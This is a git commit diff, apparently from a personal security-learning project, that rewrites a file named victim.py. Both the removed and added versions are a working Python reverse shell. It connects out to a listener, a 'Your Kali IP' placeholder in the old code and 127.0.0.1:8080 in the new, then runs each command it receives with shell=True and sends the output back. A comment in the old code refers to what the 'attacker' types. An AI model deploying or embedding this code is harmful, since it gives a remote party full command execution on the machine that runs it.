891498258f38eb3a09897c9ae69b1ee52e0b7c92
theNareshofficial <thenareshoffcial@gmail.com>
2024-09-04 21:05:53 +0530

    Upgraded

--- victim.py
+++ victim.py
@@ -1,53 +1,44 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 
 import socket
 import subprocess
-import os
 
-ip_addr = "Your Kali IP"         # use your kali IP address
-port = 8080                      # use any port
+class Victim:
+            
+    def __init__(self, sock=None):
+        try:
+            if sock is None:
+                print("[~] Creating New Socket")
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                print("[+] Socket Created")
+            else:
+                print("[+] Socket Already Exists")
+                self.sock = sock
+        except Exception as sock_error:
+            print(f"[!] Socket Error: {sock_error}")
 
-def clear():    
+    def Start_server(self, host="127.0.0.1", port=8080):
+        try:
+            print(f"[~] Connecting to {host}:{port}")
+            self.sock.connect((host, port))
+            print(f"[+] Connected to {host}:{port}")
 
-    name = os.name
-
-    if name == "nt":
-        os.system("cls")
-    else:
-        os.system("clear")
-clear()
-
-def connect():
-
-    print("[!] Waiting for connection...")
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip_addr, port))
-    print("[+] Connected from : ", ip_addr)
-
-    while True:
-
-        command = s.recv(1024)
-
-        if not command:
-            break
-        if b"terminate" in command:
-            s.close()
-            break
-        else:
-            CMD = subprocess.Popen(command.decode().strip(),
-                                   shell=True,
-                                   stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE)
-
-            output_byte = CMD.stdout.read()
-            error_byte = CMD.stderr.read()
-            s.send(output_byte)
-            s.send(error_byte)
-            # print("Server : ",command)       if you want to see what attacker typing enable this command
-
-
-def main():
-    connect()
+            while True:
+                command = self.sock.recv(1024)
+                if not command:
+                    print(f"[!] Connection Lost from {host}")
+                    break
+                else:                                  
+                    command = subprocess.Popen(command.decode().strip(), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                    output_byte = command.stdout.read() + command.stderr.read()
+                    self.sock.send(output_byte)
+                        
+        except Exception as start_server_error:
+            print(f"[!] Start Server Error: {start_server_error}")
+        finally:
+            self.sock.close()
+            print("[~] Socket Closed")
 
 if __name__ == "__main__":
-    main()
+    victim = Victim()
+    victim.Start_server()
